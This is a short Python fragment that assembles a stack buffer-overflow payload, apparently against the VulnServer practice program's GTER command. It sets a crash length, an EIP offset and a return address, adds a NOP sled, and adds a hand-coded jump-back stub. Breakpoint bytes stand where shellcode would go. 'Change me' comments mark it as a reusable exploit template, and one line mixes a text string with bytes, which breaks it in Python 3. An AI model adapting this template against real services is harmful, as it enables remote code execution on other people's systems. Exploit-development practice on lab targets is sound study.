 -------------8<-------------
VULNSRVR_CMD = b"GTER /.:/ "  # change me
CRASH_LEN = 5011  # change me
OFFSET = 146  # change me
SLED_LENGTH = 5
 -------------8<-------------
payload = VULNSRVR_CMD
payload += b"A" * 50  # offset to esp-0x64
payload += "\xcc" * 4
payload += b"B" * (OFFSET - len(payload) + len(VULNSRVR_CMD))
payload += struct.pack("<I", 0x625011af)  # change me
payload += b"\x90" * SLED_LENGTH
payload += b"\x54\x59\x83\xe9\x64\xff\xe1"  # push esp # pop ecx # sub ecx, 0x64 # jmp ecx
payload += b"C" * (CRASH_LEN - len(payload))
-------------8<-------------